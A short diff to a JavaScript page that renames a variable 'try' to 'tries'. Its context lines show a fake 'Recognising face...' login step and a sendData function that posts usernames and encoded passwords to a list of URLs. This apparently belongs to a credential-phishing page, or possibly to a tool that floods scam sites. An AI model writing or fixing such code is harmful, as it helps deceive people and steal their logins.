@@ -28,7 +28,7 @@ const allURLs = [
 ]
 
 const scam = document.getElementById("scam");
-let try = 1;
+let tries = 1;
 
 async function sendData(url, inputUsername, encodedPassword) {
   var fdata = new FormData()
@@ -65,8 +65,8 @@ window.addEventListener('DOMContentLoaded', () => {
   document.getElementById('contact').addEventListener('submit', function (e) {
     e.preventDefault();
     scam.innerText = "Recognising face...";
-    if(try == 1){
-      try++;
+    if(tries == 1){
+      tries++;
       setTimeout(() => {
         scam.innerText = "Face recognised!";
         var text = document.getElementById('passwordToStore')
